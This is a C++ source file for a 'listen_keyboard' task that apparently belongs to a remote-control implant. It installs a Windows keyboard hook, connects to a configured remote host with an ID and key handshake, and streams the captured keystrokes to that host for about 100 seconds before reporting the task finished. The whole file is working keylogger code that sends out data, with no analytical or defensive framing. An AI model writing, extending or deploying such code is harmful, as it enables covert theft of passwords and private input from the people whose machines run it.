#include "pch.h"
#include "../connection/client.h"
#include "listen_keyboard.h"
#include "config.h"
#include "handlers/keylog.h"
#include <thread>

bool flag;

listen_keyboard::listen_keyboard(string _taskId) {
	taskId = std::move(_taskId);
}

void waitForSecond(int msecond, string taskId)
{
	Sleep(msecond);
	flag = true;
	HookKeyLogger.KeyLoggerFini();
	client::instance->sendPacket(response{ finished, taskId, "" }.dump());
}

void exec(client* client)
{
	MSG msg;
	HookKeyLogger.KeyLoggerInit(client);
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (flag) break;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void listen_keyboard::execute() {
	client client(config::host, config::port);
	client.connect();
	client.handshake(config::id, config::key, transfer, taskId);
	flag = false;
	thread t1(exec, &client);
	t1.detach();
	thread t2(waitForSecond, 100000, taskId);
	t2.detach();
}
